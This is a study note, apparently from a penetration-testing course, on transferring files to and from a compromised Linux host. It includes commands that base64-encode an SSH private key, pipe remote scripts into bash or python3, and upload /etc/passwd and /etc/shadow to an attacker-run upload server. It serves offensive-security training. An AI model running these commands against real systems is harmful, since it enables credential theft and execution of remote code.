---
title: File Transfer - Linux
draft: false
tags:
---

# Download to Linux
## Base64



First use md5sum to check the file we want to transfer:

```shell-session
[!bash!]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

Now base64 encode the target:

```shell-session
[!bash!]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRU<snip>
```

On target system, decode base64 string:

```shell-session
[!bash!]$ echo -n 'LS0tLS1<snip>' | base64 -d > id_rsa
```

After transferring, confirm the content with md5sum:

```shell-session
[!bash!]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

## wget


```shell-session
[!bash!]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

## cURL


```shell-session
[!bash!]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```


## Fileless

We don't have to download. We can use the memory. 
### Fileless cURL

```shell-session
[!bash!]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Fileless wget

```shell-session
[!bash!]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

## Bash

First connect to the target webserver:

```shell-session
[!bash!]$ exec 3<>/dev/tcp/10.10.10.32/80
```

Send http get request:

```shell-session
[!bash!]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```


Print the response:

```shell-session
[!bash!]$ cat <&3
```

## SSH

```shell-session
[!bash!]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
```

# Upload to Linux

Sometimes we need to upload files from our target machine to attack host. 

## Upload Server

Let's see how we can configure uploadserver module to use HTTPs. 

Spin up Web server:

```shell-session
[!bash!]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

Now we will create a certificate:

```shell-session
[!bash!]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

Let's start a web server:

```shell-session
[!bash!]$ mkdir https && cd https
```

```shell-session
[!bash!]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files:

```shell-session
[!bash!]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

## Python

For Python3:

```shell-session
[!bash!]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

For Python2:

```shell-session
[!bash!]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

## PHP

```shell-session
[!bash!]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

## Ruby

```shell-session
!bash!]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

## SCP

```shell-session
[!bash!]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

htb-student@10.129.86.90's password: 
passwd    
```

For copying entire directory:

```shell-session
jadu101@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```